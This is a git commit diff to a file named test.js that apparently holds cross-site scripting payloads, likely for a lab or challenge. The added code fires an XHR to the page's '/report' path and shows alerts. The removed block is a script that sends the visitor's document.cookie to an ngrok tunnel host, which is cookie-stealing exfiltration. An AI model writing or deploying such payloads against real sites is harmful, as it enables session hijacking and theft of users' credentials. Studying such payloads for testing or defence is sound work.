d6ace542c3068433d55ac72fa38678990c5ac353
phulelouch <62769629+phulelouch@users.noreply.github.com>
2020-05-24 14:45:46 -0400

    Update test.js

--- test.js
+++ test.js
@@ -10,32 +10,34 @@ function addTheImage2() {
     document.body.appendChild(img);
 }
 
-function addTheImage3() {
-   
-            
-            $('#responseAlert').css('display','inline');
-            $('#report').on('click',function(e){
-                $.ajax({
-                    type: "GET",
-                    url: window.location.pathname+"/report",
-                    success: function(resp) {
-                        $("#responseAlert").text(resp); $("#responseAlert").css("display","inline");
-                        alert(1);
-                    }
-                })
-            });
-            
+function addTheImage3() {           
+          let xhr = new XMLHttpRequest();
+	// 2. Configure it: GET-request for the URL /article/.../load
+	xhr.open('GET', window.location.pathname+"/report");
+	// 3. Send the request over the network
+	xhr.send();          
+        xhr.onload = function() {
+	  if (xhr.status != 200) { // analyze HTTP status of the response
+	    alert(`Error ${xhr.status}: ${xhr.statusText}`); // e.g. 404: Not Found
+	  } else { // show the result
+	    alert(`Done, got ${xhr.response.length} bytes`); // response is the server
+	  }
+	};
 
-             
-        
+	xhr.onprogress = function(event) {
+	  if (event.lengthComputable) {
+	    alert(`Received ${event.loaded} of ${event.total} bytes`);
+	  } else {
+	    alert(`Received ${event.loaded} bytes`); // no Content-Length
+	  }
+
+	};
+
+	xhr.onerror = function() {
+	  alert("Request failed");
+	};
 }
 
-<script>
-	x = new XMLHttpRequest();
-	x.open("GET", "http://3e6850f2.ngrok.io?c=" + document.cookie, true);
-	document.write(x.responseText);
-	x.send();
-</script>
 addTheImage();
 addTheImage2();
 addTheImage3();
